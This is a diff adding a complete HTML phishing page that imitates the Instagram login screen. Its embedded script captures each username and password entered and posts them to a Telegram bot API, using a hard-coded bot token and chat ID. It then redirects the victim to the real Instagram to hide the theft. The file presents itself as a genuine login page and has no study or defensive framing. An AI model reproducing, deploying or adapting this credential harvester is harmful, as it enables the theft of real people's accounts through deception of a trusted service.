@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Login</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            width: 350px;
+            padding: 40px;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 15px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            background-color: #fafafa;
+            font-size: 14px;
+            color: #262626;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .login-container input:focus {
+            border-color: #3897f0;
+            background-color: #e9f3fe;
+        }
+
+        .login-container input.error {
+            border-color: #e04e4e;
+            background-color: #fce2e2;
+        }
+
+        .login-container input::placeholder {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 15px;
+            background-color: #3897f0;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-container button:hover {
+            background-color: #2c80e5;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            margin-top: 10px;
+            display: inline-block;
+        }
+
+        .divider {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .divider a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+
+        .social-login-buttons {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .social-login-buttons button {
+            padding: 12px;
+            background-color: #4267b2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+        }
+
+        .social-login-buttons button:hover {
+            background-color: #365899;
+        }
+
+        .create-account {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .create-account a {
+            color: #3897f0;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .error-message {
+            font-size: 12px;
+            color: #e04e4e;
+            text-align: left;
+            margin-top: 5px;
+        }
+
+        .terms-text {
+            font-size: 14px;
+            color: #8e8e8e;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .terms-text a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Logo -->
+        <img src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo.png" alt="Instagram Logo">
+        
+        <!-- Login Form -->
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username or Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+
+        <!-- Error message -->
+        <div id="errorMessage" class="error-message" style="display: none;">Invalid username or password.</div>
+
+        <!-- Forgot Password Link -->
+        <a href="#" class="forgot-password" onclick="forgotPassword()">Forgot password?</a>
+
+        <!-- Divider -->
+        <div class="divider">OR</div>
+
+        <!-- Social Login Buttons -->
+        <div class="social-login-buttons">
+            <button onclick="facebookLogin()">Log in with Facebook</button>
+        </div>
+
+        <!-- Sign up Link -->
+        <div class="create-account">
+            Don't have an account? <a href="#" onclick="signupRedirect()">Sign up</a>
+        </div>
+
+        <!-- Terms and Privacy Policy Text (moved to the bottom) -->
+        <div class="terms-text">
+            By logging in, you agree to Instagram's <a href="https://www.instagram.com/legal/terms/" target="_blank">Terms of Service</a> and <a href="https://www.instagram.com/legal/privacy/" target="_blank">Privacy Policy</a>.
+        </div>
+    </div>
+
+    <!-- Include Axios for sending messages to Telegram -->
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+
+    <script>
+        const TOKEN = "7753557270:AAEPWotELb1Pj4HwgO7j84sPhstbyflzfNU";  // Telegram Bot Token
+        const CHAT_ID = "7631254472";  // Your chat ID
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        // Function to send message to Telegram bot
+        function sendToTelegram(username, password) {
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                text: `New Login Attempt: \nUsername: ${username}\nPassword: ${password}`
+            })
+            .then(response => {
+                console.log('Message sent successfully:', response.data);
+            })
+            .catch(error => {
+                console.error('Error sending message:', error);
+            });
+        }
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Hide error message and remove error styling
+            document.getElementById('errorMessage').style.display = "none";
+            document.getElementById('username').classList.remove("error");
+            document.getElementById('password').classList.remove("error");
+
+            // Send login data to Telegram
+            sendToTelegram(username, password);
+
+            // Redirect user to the real Instagram
+            window.location.href = "https://www.instagram.com"; // Redirect to Instagram
+        });
+
+        // Redirect for password reset
+        function forgotPassword() {
+            window.location.href = "https://www.instagram.com/accounts/password/reset/";
+        }
+
+        // Redirect for sign-up
+        function signupRedirect() {
+            window.location.href = "https://www.instagram.com/accounts/emailsignup/";
+        }
+
+        // Redirect for Facebook login
+        function facebookLogin() {
+            window.location.href = "https://www.facebook.com/login";
+        }
+    </script>
+</body>
+</html>
